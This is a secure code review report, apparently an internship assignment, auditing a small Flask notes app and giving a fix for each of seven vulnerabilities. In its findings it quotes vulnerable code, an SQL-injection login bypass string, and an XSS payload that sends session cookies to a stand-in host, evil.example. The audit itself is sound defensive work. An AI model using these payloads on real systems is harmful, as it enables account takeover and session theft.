# Secure Code Review — Audit Report

**CodeAlpha Cyber Security Internship — Task 3**

| | |
|---|---|
| **Application audited** | Notes Portal (`vulnerable_app.py`) — a small Flask web app for user registration, login, and personal notes |
| **Language / Stack** | Python 3, Flask, SQLite |
| **Review type** | Manual source code review (line-by-line inspection) |
| **Lines of code** | ~165 |
| **Findings** | 7 vulnerabilities — 2 Critical, 3 High, 2 Medium |

## 1. Methodology

The application was reviewed manually, function by function, against the OWASP Top 10 (2021) categories — injection, broken authentication, sensitive data exposure, broken access control, and security misconfiguration. Each route (`/register`, `/login`, `/notes`, `/notes/<id>`, `/search`) was traced from the point user input enters the app to the point it is used in a query, rendered in HTML, or stored, to check whether it was validated, escaped, or parameterized along the way.

Static-analysis tooling such as `bandit` (Python's standard SAST tool for Flask/Django code) is recommended as a complementary step in a real-world review — it would have flagged the hardcoded secret key, the `debug=True` flag, and the SQL string-formatting pattern automatically. This review focuses on manual inspection so that the reasoning behind each finding is fully documented.

## 2. Summary of Findings

| ID | Vulnerability | Severity | OWASP Category |
|----|----------------|----------|-----------------|
| VULN-1 | SQL Injection in login | Critical | A03: Injection |
| VULN-2 | Hardcoded secret key | High | A02: Cryptographic Failures |
| VULN-3 | Plaintext password storage | Critical | A02: Cryptographic Failures |
| VULN-4 | Cross-Site Scripting (XSS) in notes & search | High | A03: Injection |
| VULN-5 | Missing CSRF protection | Medium | A01: Broken Access Control |
| VULN-6 | Insecure Direct Object Reference (IDOR) | High | A01: Broken Access Control |
| VULN-7 | Debug mode enabled | Medium | A05: Security Misconfiguration |

## 3. Detailed Findings

### VULN-1: SQL Injection — `login()`, ~line 80

**Issue:** The login query is built with an f-string that drops the raw username and password straight into the SQL statement:

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Impact:** An attacker can submit a username like `' OR '1'='1' --` to bypass authentication entirely and log in as the first user in the table, without knowing any valid password. Depending on the SQLite build, more advanced payloads could also be used to read other tables.

**Fix — use parameterized queries, never string formatting for SQL:**

```python
user = conn.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
).fetchone()
```

### VULN-2: Hardcoded Secret Key — line 28

**Issue:** `app.secret_key = "supersecret123"` is committed directly in the source file.

**Impact:** Flask uses this key to cryptographically sign session cookies. Anyone with access to the source (e.g. a public GitHub repo) can forge valid session cookies for any user, bypassing login entirely.

**Fix — load it from an environment variable, never from source:**

```python
import os
app.secret_key = os.environ["FLASK_SECRET_KEY"]  # set via .env or a secrets manager
```

### VULN-3: Plaintext Password Storage — `register()`, ~line 61

**Issue:** Passwords are inserted into the database exactly as the user typed them, with no hashing.

**Impact:** If the database is ever leaked, copied, or accessed by an insider, every user's password is immediately exposed in cleartext — and since most people reuse passwords, this risk extends to their other accounts too.

**Fix — hash with a slow, salted algorithm such as `werkzeug.security` or `bcrypt`:**

```python
from werkzeug.security import generate_password_hash, check_password_hash

# On register:
hashed = generate_password_hash(password)
conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed))

# On login:
user = conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
if user and check_password_hash(user["password"], password):
    ...
```

### VULN-4: Cross-Site Scripting (XSS) — `notes()` ~line 117 and `search()` ~line 154

**Issue:** Both the notes list and the search page build HTML with raw f-strings instead of Jinja2's auto-escaping template rendering:

```python
notes_html = "".join(f"<li><b>{r['title']}</b>: {r['body']}...")
return f"<p>You searched for: {query}</p>"
```

**Impact:** If a title or search term contains `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`, it executes in the victim's browser when the page is viewed — allowing session-cookie theft or page defacement for any user who views that note or search result.

**Fix — let Jinja2 auto-escape by rendering a real template instead of an f-string:**

```python
from flask import render_template  # render_template (not render_template_string) auto-escapes by default

return render_template("notes.html", notes=rows)
# notes.html: <li><b>{{ note.title }}</b>: {{ note.body }}</li>
```

If `render_template_string` must be used, pass data as variables rather than interpolating them into the string, so Jinja2's autoescaping still applies:

```python
return render_template_string("<p>You searched for: {{ q }}</p>", q=query)
```

### VULN-5: Missing CSRF Protection — `notes()` POST handler, ~line 108

**Issue:** The "Add Note" form has no CSRF token, so the server cannot tell a legitimate request from one triggered by a malicious third-party page.

**Impact:** An attacker can host a page with an auto-submitting form pointing at `/notes`. If a logged-in victim visits that page, a note is silently created (or in a more sensitive app, a password could be changed or a transfer made) using the victim's own session.

**Fix — use Flask-WTF's CSRF protection:**

```python
from flask_wtf import CSRFProtect
csrf = CSRFProtect(app)
# and add {{ csrf_token() }} as a hidden field in every state-changing form
```

### VULN-6: Insecure Direct Object Reference (IDOR) — `view_note()`, ~line 140

**Issue:** A note is fetched purely by its numeric ID, with no check that it belongs to the logged-in user:

```python
note = conn.execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
```

**Impact:** Any logged-in user can read any other user's private notes simply by changing the number in the URL (`/notes/1`, `/notes/2`, ...).

**Fix — always scope the query to the current session's owner:**

```python
note = conn.execute(
    "SELECT * FROM notes WHERE id=? AND owner_id=?",
    (note_id, session["user_id"])
).fetchone()
if not note:
    return "Not found", 404
```

### VULN-7: Debug Mode Enabled — `app.run(debug=True)`, ~line 162

**Issue:** Flask's debug mode is left on.

**Impact:** Debug mode exposes the Werkzeug interactive debugger in the browser whenever an unhandled exception occurs. That debugger has a built-in Python console with no authentication — if reachable, it gives an attacker full remote code execution on the server.

**Fix — never enable debug mode outside local development, and control it via environment, not hardcoded:**

```python
app.run(debug=os.environ.get("FLASK_DEBUG", "0") == "1")
```

## 4. General Recommendations

- Adopt parameterized queries as a hard rule for all database access — never build SQL with string formatting.
- Always hash passwords with `werkzeug.security`, `bcrypt`, or `argon2`; never store them as-is.
- Move all secrets (signing keys, DB credentials, API keys) out of source code and into environment variables or a secrets manager.
- Default to Jinja2's `render_template` for any HTML containing user-controlled data, so autoescaping is on by default.
- Add ownership checks on every route that fetches a resource by ID.
- Enable CSRF protection globally with Flask-WTF rather than per-form.
- Keep `debug=True` strictly to local development; use a proper WSGI server (gunicorn/uwsgi) in any deployed environment.

## 5. Conclusion

The reviewed application contains multiple critical and high-severity vulnerabilities typical of an early-stage or learning project: unparameterized SQL queries, plaintext password storage, missing output encoding, and broken access control on a per-resource basis. None of these require advanced exploitation skill — all seven findings could be discovered with manual inspection in under an hour, which underlines how much value a lightweight code review step adds before any code reaches production. The fixes listed above are minimal, idiomatic changes that remove each vulnerability without changing the app's functionality.
